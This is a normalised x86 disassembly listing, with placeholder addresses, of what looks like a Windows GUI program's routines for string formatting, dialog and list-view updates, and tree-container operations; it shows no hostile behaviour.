push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov al [ rw-data ]
test al al
mov eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ esi * 4 + rw-data ]
inc eax
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
mov eax [ rw-data ]
mov esi edi
add eax edx
cmp esi eax
jl r-xdata
mov [ esi * 4 + rw-data ] 0x6f
mov edx [ esp + 0x34 ]
inc esi
push esi
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call ebx
mov eax [ edi + rw-data ]
mov ecx [ eax + ebp + 0x18 ]
add eax ebp
add esp 0x10
cmp ecx 0x10
jb r-xdata
cmp esi edx
jge r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4355b0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4355b0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
lea edi [ esi + 0x1 ]
push edi
lea edx [ esp + 0x3c ]
push r--data
push edx
call ebx
mov eax [ esi * 4 + rw-data ]
add esp 0xc
cmp eax ebp
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
lea edx [ esp + 0x138 ]
push edx
push rw-data
call sub_42c180
add esp 0x8
lea eax [ esp + 0x138 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
lea ecx [ esp + 0x138 ]
push ecx
push rw-data
call sub_42c180
add esp 0x8
lea edx [ esp + 0x138 ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
xor ebp ebp
mov [ esp + 0x10 ] ebp
jmp r-xdata
mov eax rw-data
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x240 ]
call sub_435580
add ebp 0x1c
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
xor esi esi
mov edx [ esp + 0x10 ]
inc ebp
push ebp
lea eax [ esp + 0x18 ]
push r--data
push eax
lea esi [ edx + ecx ]
call ebx
add esp 0xc
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov edx [ esi ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ esi + 0x4 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ esi + 0x8 ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ esi + 0xc ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ esi + 0x10 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ esi + 0x14 ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ esi + 0x18 ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
xor eax eax
add esi 0x1c
nop
cmp ebp edx
jge r-xdata
lea edi [ esi + 0x1 ]
push edi
lea eax [ esp + 0x3c ]
push r--data
push eax
call ebx
mov ecx [ esi * 4 + rw-data ]
add esp 0xc
push ecx
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov esi edi
cmp esi 0xab
jb r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
xor ebp ebp
mov edi rw-data
nop
lea edi [ eax + 0x1 ]
push edi
lea eax [ esp + 0x3c ]
push r--data
push eax
call ebx
mov ecx [ esi ]
add esp 0xc
push ecx
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax edi
add esi 0x4
cmp eax 0x30
jl r-xdata
add [ esp + 0x10 ] 0xdc
jmp r-xdata
lea esi [ eax + 0x1 ]
push esi
push ebp
lea eax [ esp + 0x40 ]
push r--data
push eax
call ebx
mov ecx [ edi ]
add esp 0x10
push ecx
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax esi
add edi 0x4
cmp eax 0x8
jl r-xdata
cmp edi rw-data
jl r-xdata
xor eax eax
inc ebp
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
xor edi edi
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
xor ebp ebp
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebp
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1024c ] 0x1
mov esi rw-data
lea esp [ esp ]
lea esi [ edi + 0x1 ]
push esi
lea edx [ esp + 0x3c ]
push r--data
push edx
call ebx
mov eax [ rw-data ]
mov ecx [ eax + edi * 4 ]
add esp 0xc
push ecx
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edi esi
jmp r-xdata
cmp edi eax
jge r-xdata
add esi 0x10
inc ebp
cmp esi rw-data
jl r-xdata
mov eax [ esi + 0x4 ]
sub eax ecx
sar eax 0x2
test eax eax
jle r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
cmp [ esp + 0x2c ] 0x10
mov [ esp + 0x1024c ] 0x0
jb r-xdata
mov eax ecx
mov edx [ eax ]
push edx
lea eax [ esp + 0x13c ]
push r--data
push eax
call ebx
lea eax [ esp + 0x144 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
xor edi edi
push r--data
lea ecx [ esp + 0x23c ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] edi
mov [ esp + 0x1c ] 0x0
call sub_4354c0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
xor esi esi
mov ebp 0x10
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x13c ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401e80
mov edi 0x1
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
inc esi
push esi
lea ecx [ esp + 0x3c ]
push r--data
push ecx
call ebx
mov eax [ rw-data ]
mov ecx [ edi + eax + 0x18 ]
add esp 0xc
cmp ecx ebp
jb r-xdata
cmp esi edx
jge r-xdata
lea eax [ ebp + 0x1 ]
push eax
lea ecx [ esp + 0x3c ]
push r--data
push ecx
call ebx
mov eax [ esp + 0x38 ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov edx [ esi ]
mov eax [ edx + edi * 4 ]
push eax
lea ecx [ esp + 0x13c ]
push r--data
push ecx
call ebx
lea eax [ esp + 0x144 ]
add esp 0xc
lea edx [ eax + 0x1 ]
cmp edi eax
jge r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
lea eax [ edi + eax + 0x4 ]
mov eax [ edi + eax + 0x4 ]
jmp r-xdata
push eax
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_435580
lea eax [ esp + 0x18 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x13c ]
push edx
lea ecx [ esp + 0x1c ]
call sub_401cc0
inc edi
jmp r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
push eax
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x240 ]
call sub_435580
add edi 0x1c
jmp r-xdata
mov ecx [ esi ]
test ecx ecx
jne r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov eax [ rw-data ]
pop edi
pop esi
cmp eax ebp
mov eax [ rw-data ]
pop ebp
pop ebx
jae r-xdata
mov eax rw-data
push eax
push r--data
lea ecx [ esp + 0x230 ]
call sub_435580
lea edx [ esp + 0x228 ]
push edx
call sub_413720
mov eax [ esp + 0x1024c ]
add esp 0x4
push eax
lea ecx [ esp + 0x22c ]
call sub_4356e0
lea ecx [ esp + 0x228 ]
mov [ esp + 0x1023c ] 0xffffffff
call sub_434eb0
mov ecx [ esp + 0x10234 ]
mov [ fs : 0x0 ] ecx
add esp 0x10240
retn
mov eax rw-data
sub_464fe0
push esi
mov esi [ esp + 0x8 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ rw-data ]
push esi
push eax
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_401dd0
mov eax esi
mov [ rw-data ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_401dd0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
mov ecx rw-data
call sub_401e80
mov ecx [ rw-data ]
push 0x0
push 0x9c4e
push 0x111
push ecx
call [ SendMessageA@IAT ]
pop esi
retn
sub_465090
mov al [ rw-data ]
sub esp 0x94
test al 0x1
jne r-xdata
mov eax [ esp + 0x9c ]
cmp eax 0x4e
push esi
je r-xdata
mov edx [ rw-data ]
or edx 0x1
push sub_4c3070
mov [ rw-data ] edx
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_4b6619
add esp 0x4
mov edx [ esp + 0xa8 ]
cmp [ edx + 0x8 ] 0xfffffda2
jne r-xdata
cmp eax 0x110
je r-xdata
xor eax eax
pop esi
add esp 0x94
retn 0x10
mov eax [ esp + 0x9c ]
push 0x0
push 0x0
push 0x1027
push 0x1
push 0x461
push eax
call [ GetParent@IAT ]
mov esi [ GetDlgItem@IAT ]
push eax
call esi
push eax
call esi
push eax
call [ SendMessageA@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
cmp eax 0x1402
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push eax
push edx
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
mov eax rw-data
push ebx
push ebp
mov ebp [ GetParent@IAT ]
push edi
mov edi [ esp + 0xa8 ]
push 0x1
push 0x461
push edi
call ebp
mov esi [ GetDlgItem@IAT ]
push eax
call esi
push eax
call esi
push eax
call [ LockWindowUpdate@IAT ]
push 0x0
push 0x0
push 0x1028
push 0x1
push 0x461
push edi
call ebp
push eax
call esi
push eax
call esi
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1004
push 0x1
push 0x461
lea edx [ ecx + eax - 0x1 ]
push edi
mov [ rw-data ] edx
call ebp
push eax
call esi
push eax
call esi
push eax
call ebx
mov ecx [ rw-data ]
cmp ecx eax
jl r-xdata
lea eax [ esp + 0x4 ]
push eax
mov [ esp + 0x8 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_401dd0
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
add esp 0x94
retn 0x10
push 0x0
push ecx
push 0x1013
push 0x1
push 0x461
push edi
call ebp
push eax
call esi
push eax
call esi
push eax
call ebx
push 0x0
call [ LockWindowUpdate@IAT ]
push 0x0
push 0x0
push 0x1
push 0x461
push edi
call ebp
push eax
call esi
push eax
call esi
push eax
call [ InvalidateRect@IAT ]
push 0x1
push 0x461
push edi
call ebp
push eax
call esi
push eax
call esi
push eax
call [ UpdateWindow@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0x94
retn 0x10
push 0x0
push 0x0
push 0x1004
push 0x1
push 0x461
push edi
call ebp
push eax
call esi
push eax
call esi
push eax
call ebx
mov ecx eax
dec ecx
mov [ rw-data ] ecx
mov eax 0x1
pop esi
add esp 0x94
retn 0x10
cmp [ esp + 0x14 ] 0x2
jne r-xdata
mov ecx [ esp + 0x9c ]
push 0x0
push 0x0
push 0x1402
push ecx
call [ PostMessageA@IAT ]
sub_465300
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov [ esp + 0x10 ] ecx
mov edi ecx
add esi 0x4
mov ebp 0x20
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax ebx
push eax
push edx
mov ecx edi
call sub_401e80
add esi 0x1c
add edi 0x1c
dec ebp
jne r-xdata
mov eax edx
lea ebx [ eax + 0x1 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x380 ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ eax + 0x380 ] ecx
pop ebx
pop ecx
retn 0x4
sub_465360
push 0xffffffff
push sub_4c0d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4653e0
mov edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx edx
push esi
push edi
mov esi ecx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] ebx
pop ebx
retn 0xc
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x8 ]
push ecx
push ebx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_45f3f0
mov edx [ esp + 0x20 ]
push edx
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push eax
push edi
call sub_461b30
add esp 0x20
mov [ esi + 0x8 ] edi
sub_465430
push 0xffffffff
push sub_4c0d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4654b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0d08
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x1ffffffe
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_4603f0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x14 ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x14 ] bl
mov [ edx + 0x14 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x14 ] bl
mov [ edx + 0x14 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_45da10
mov esi ecx
push esi
mov ecx edi
call sub_45da90
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x14 ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_45da90
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_45da10
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_465690
push 0xffffffff
push sub_4c0d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push esi
push edi
mov edi [ esp + 0x6c ]
mov al [ edi + 0x2d ]
test al al
mov [ esp + 0xc ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x74 ]
mov [ esp + 0x18 ] ebx
call sub_432ab0
mov ebp [ edi ]
mov al [ ebp + 0x2d ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x2d ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401e80
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x74 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x2d ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x2c ]
mov al [ edi + 0x2c ]
mov [ edi + 0x2c ] dl
mov [ ebx + 0x2c ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esi + 0x24 ]
add esi 0xc
cmp eax 0x10
pop ebp
pop ebx
jb r-xdata
mov ecx [ edi + 0x4 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x18 ]
mov cl [ eax + 0x2c ]
mov edi [ esp + 0x14 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
push ebp
call sub_432860
mov ecx [ esp + 0x18 ]
add esp 0x4
mov eax esi
jmp r-xdata
lea eax [ esp + 0xb ]
push eax
mov ecx esi
mov [ esi + 0x18 ] 0xf
mov [ esp + 0xf ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_4010a0
push eax
call sub_401010
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0xc
test eax eax
jbe r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ ebp + 0x2c ] bl
cmp [ ebp + 0x2c ] bl
jne r-xdata
push ebp
call sub_432840
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x58 ]
pop edi
mov [ eax ] edx
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x8
dec eax
mov [ edi + 0x8 ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
call sub_40b000
mov eax [ esi ]
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
